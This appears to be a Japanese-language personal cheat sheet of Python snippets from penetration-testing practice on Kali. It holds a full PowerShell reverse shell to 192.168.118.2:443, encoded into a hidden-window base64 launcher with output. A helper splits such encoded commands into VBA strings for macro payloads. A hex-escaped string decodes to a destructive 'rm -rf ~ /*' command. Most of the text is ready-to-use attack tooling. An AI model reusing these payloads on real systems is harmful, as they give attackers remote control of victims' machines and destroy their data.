# Pythonコード集

### 長い文字列を分割する方法（VBA用）

```python
#!/usr/bin/python3

str = "powershell.exe -nop -w hidden -e 
・・・・"

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```



### バイト文字列を変換

```python
kali@kali:~$ python

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```



### HTTPServer

```
python -m SimpleHTTPServer 9005
```



### ValueError: unsupported hash type md4を出さなくする方法

https://qiita.com/madaaamj/items/2f1b8d5cda2e1831ec68



### powershellリバースシェルをbase64でエンコード

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

```bash
kali@kali:~$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
